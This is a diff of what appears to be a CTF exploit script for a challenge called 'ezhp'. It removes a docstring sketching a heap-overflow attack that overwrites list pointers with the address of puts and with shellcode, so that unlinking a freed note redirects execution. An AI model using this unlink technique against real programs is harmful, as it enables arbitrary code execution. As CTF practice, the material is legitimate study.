@@ -56,35 +56,3 @@ def pmain():
 
 
 pmain()
-
-"""
-ezhp scenario
-
-add three notes - id0 id1 id2
-
-	change_note(0x01, 132 + 8, data)
-	change_note(0x00, 132+len(sc), "A"*132+sc)
-
-in payload:
-id2->prev = puts
-id1->head = shellcode
-
-deallocate algorithm
-
-if (curr->prev)
-	curr->prev->next = curr->next // now puts
-
-	1->next = 2->next
-
-	
-
-if (curr->next)
-	curr->next->prev = curr->prev
-
-so.
-
-
-0
-1->shellcode
-2->prev = puts
-"""
